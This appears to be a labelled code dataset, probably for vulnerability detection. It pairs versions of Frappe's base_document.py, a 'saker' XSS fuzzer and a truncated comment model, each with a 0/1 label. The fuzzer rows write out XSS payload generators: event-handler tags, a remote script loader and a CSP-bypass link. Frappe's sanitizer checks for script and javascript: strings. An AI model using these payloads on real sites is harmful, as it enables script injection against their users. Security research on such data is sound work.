		cache_key = parentfield or ""main""

		if not hasattr(self, ""_precision""):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in (""Currency"", ""Float"", ""Percent""):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, ""parent_doc"", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		""""""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = [""field1"", ""field2""]

		:param fieldname: Fieldname to be checked if hidden.
		""""""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get(""__print_hide""):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		""""""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format.""""""
		doc = getattr(self, ""parent_doc"", self)

		if hasattr(doc, ""format_data_map""):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		""""""If the user does not have permissions at permlevel > 0, then reset the values to original / default""""""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != ""DocType"":
			for df in self.meta.get(""fields"", {""fieldtype"": ('=', ""Text Editor"")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	""""""pass filters as:
		{""key"": ""val"", ""key"": [""!="", ""val""],
		""key"": [""in"", ""val""], ""key"": [""not in"", ""val""], ""key"": ""^val"",
		""key"" : True (exists), ""key"": False (does not exist) }""""""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = (""not None"", fval)
				elif fval is False:
					fval = (""None"", fval)
				elif isinstance(fval, string_types) and fval.startswith(""^""):
					fval = (""^"", fval[1:])
				else:
					fval = (""="", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out
/n/n/n",0
73,73,acd2f589b6cd2d1011be4a4e4965a1b3ed489c37,"/frappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	""""""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string.""""""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value(""DocType"", doctype, (""module"", ""custom""), cache=True) \
			or [""Core"", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace("" "", """").replace(""-"", """")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = (""doctype"", ""_meta"", ""meta"", ""_table_fields"", ""_valid_columns"")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, ""__setup__""):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, ""_meta""):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field ""{0}"" attached to child table of ""{1}"" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if ""doctype"" not in value:
				value[""doctype""] = self.get_table_field_doctype(key)
				if not value[""doctype""]:
					raise AttributeError(key)
			value = get_controller(value[""doctype""])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, ""idx"", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, ""name"", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype==""Check"":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype==""Int"" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in (""Currency"", ""Float"", ""Percent"") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in (""Datetime"", ""Date"", ""Time"") and d[fieldname]=="""":
					d[fieldname] = None

				elif df.get(""unique"") and cstr(d[fieldname]).strip()=="""":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in (""idx"", ""docstatus"") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in (""DocField"", ""DocPerm"") and self.parent in (""DocType"", ""DocField"", ""DocPerm""):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get(""__islocal"")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc[""doctype""] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in (""_user_tags"", ""__islocal"", ""__onload"", ""_liked_by"", ""__run_link_triggers""):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		""""""INSERT the document (with valid columns) in the database.""""""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql(""""""insert into `tab{doctype}`
				({columns}) values ({values})"""""".format(
					doctype = self.doctype,
					columns = "", "".join([""`""+c+""`"" for c in columns]),
					values = "", "".join([""%s""] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if ""PRIMARY"" in cstr(e.args[1]):
					if self.meta.autoname==""hash"":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif ""Duplicate"" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set(""__islocal"", False)

	def db_update(self):
		if self.get(""__islocal"") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql(""""""update `tab{doctype}`
				set {values} where name=%s"""""".format(
					doctype = self.doctype,
					values = "", "".join([""`""+c+""`=%s"" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and ""Duplicate"" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split(""'"")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if ""unique_"" in fieldname:
			fieldname = fieldname.split(""_"", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_(""{0} must be unique"".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set(""modified"", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get(""fields""):
			if df.fieldtype == ""Check"":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == ""Int"":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in (""Float"", ""Currency"", ""Percent""):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		""""""Get mandatory fields that do not have any values""""""
		def get_msg(df):
			if df.fieldtype == ""Table"":
				return ""{}: {}: {}"".format(_(""Error""), _(""Data missing in table""), _(df.label))

			elif self.parentfield:
				return ""{}: {} {} #{}: {}: {}"".format(_(""Error""), frappe.bold(_(self.doctype)),
					_(""Row""), self.idx, _(""Value missing for""), _(df.label))

			else:
				return _(""Error: Value missing for {0}: {1}"").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get(""fields"", {""reqd"": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in (""parent"", ""parenttype""):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return ""{} #{}: {}: {}"".format(_(""Row""), self.idx, _(df.label), docname)
			else:
				return ""{}: {}"".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get(""fields"", {""fieldtype"": ('=', ""Dynamic Link"")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype==""Link"":
					doctype = df.options
					if not doctype:
						frappe.throw(_(""Options not set for link field {0}"").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_(""{0} must be set first"").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != ""amended_from""
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, ""docstatus""))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname==""naming_series"" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or """").split(""\n"")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith(""_T-"")):
				# show an elaborate message
				prefix = _(""Row #{0}:"").format(self.idx) if self.get(""parentfield"") else """"
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '"", ""'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be ""{2}"". It should be one of ""{3}""').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get(""fields"", {""set_only_once"": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_(""Value cannot be changed for {0}"").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get(""length"")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _(""{0}, Row {1}"").format(_(self.doctype), self.idx)

					else:
						reference = ""{0} {1}"".format(_(self.doctype), self.name)

					frappe.throw(_(""{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}"")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype==""Table"":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_(""Not allowed to change {0} after submission"").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		""""""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		""""""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u""<"" not in value and u"">"" not in value):
				# doesn't look like html so no need
				continue

			elif ""<!-- markdown -->"" in value and not (""<script"" in value or ""javascript:"" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get(""fieldtype"") in (""Data"", ""Code"", ""Small Text"") and df.get(""options"")==""Email"":
				sanitized_value = sanitize_email(value)

			elif df and (df.get(""ignore_xss_filter"")
						or (df.get(""fieldtype"")==""Code"" and df.get(""options"")!=""Email"")
						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"")

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get(""allow_on_submit""))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		""""""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table.""""""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or ""main""

		if not hasattr(self, ""_precision""):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in (""Currency"", ""Float"", ""Percent""):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, ""parent_doc"", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		""""""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = [""field1"", ""field2""]

		:param fieldname: Fieldname to be checked if hidden.
		""""""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get(""__print_hide""):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		""""""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format.""""""
		doc = getattr(self, ""parent_doc"", self)

		if hasattr(doc, ""format_data_map""):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		""""""If the user does not have permissions at permlevel > 0, then reset the values to original / default""""""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != ""DocType"":
			for df in self.meta.get(""fields"", {""fieldtype"": ('=', ""Text Editor"")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	""""""pass filters as:
		{""key"": ""val"", ""key"": [""!="", ""val""],
		""key"": [""in"", ""val""], ""key"": [""not in"", ""val""], ""key"": ""^val"",
		""key"" : True (exists), ""key"": False (does not exist) }""""""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = (""not None"", fval)
				elif fval is False:
					fval = (""None"", fval)
				elif isinstance(fval, string_types) and fval.startswith(""^""):
					fval = (""^"", fval[1:])
				else:
					fval = (""="", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out
/n/n/n",1
20,20,bc18f1148918f6cef38f2d7f575482dc43575b7b,"saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return ""<script>alert(/xss/)</script>""

    def img(self):
        return '<img/onerror=""%s""/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload=""%s""/>' % payload

    def style(self, payload):
        return '<style/onload=""%s""></style>' % payload

    def input(self, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",0
21,21,bc18f1148918f6cef38f2d7f575482dc43575b7b,"/saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return ""<script>alert(/xss/)</script>""

    def img(self):
        payload = ""<img src='%s'></img>"" % self.url
        return payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",1
88,88,fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d,"models/comment.py/n/nimport asyncio

import mistune
import markupsafe
from tortoise import fields
from tortoise.query_utils import Q
from arq import create_pool

from config import REDIS_URL
from .base import BaseModel
from .mc import cache, clear_mc
from .user import GithubUser
from .consts import K_COMMENT, ONE_HOUR
from .react import ReactMixin, ReactItem
from .signals import comment_reacted
from .utils import RedisSettings

markdown = mistune.Markdown()
MC_KEY_COMMENT_LIST = 'comment:%s:comment_list'
MC_KEY_N_COMMENTS = 'comment:%s:n_comments'
MC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'


class Comment(ReactMixin, BaseModel):
    github_id = fields.IntField()
    post_id = fields.IntField()
    ref_id = fields.IntField(default=0)
    kind = K_COMMENT

    class Meta:
        table = 'comments'

    async def set_content(self, content):
        return await self.set_props_by_key('content', content)

    async def save(self, *args, **kwargs):
        content = kwargs.pop('content', None)
        if content is not None:
            await self.set_content(content)
        return await super().save(*args, **kwargs)

    @property
    async def content(self):
        rv = await self.get_props_by_key('content')
        if rv:
            return rv.decode('utf-8')

    @property
    async def html_content(self):
        content = markupsafe.escape(await self.content)
        if not content:
            return ''
        return markdown(content)

    async def clear_mc(self):
        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):
            await clear_mc(key % self.post_id)

    @property
    async def user(self):
        return await GithubUser.get(gid=self.github_id)

    @property
    async def n_likes(self):
        return (await self.stats).love_count


class CommentMixin:
    async def add_comment(self, user_id, content, ref_id=0):
        obj = await Comment.create(github_id=user_id, post_id=self.id,
                                   ref_id=ref_id)
        redis = await create_pool(RedisSettings.from_url(REDIS_URL))
        await asyncio.gather(
            obj.set_content(content),
            redis.enqueue_job('mention_users', self.id, content, user_id),
            return_exceptions=True
        )
        return obj

    async def del_comment(self, user_id, comment_id):
        c = await Comment.get(id=comment_id)
        if c and c.github_id == user_id and c.post_id == self.id:
            await c.delete()
            return True
        return False

    @property
    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))
    async def comments(self):
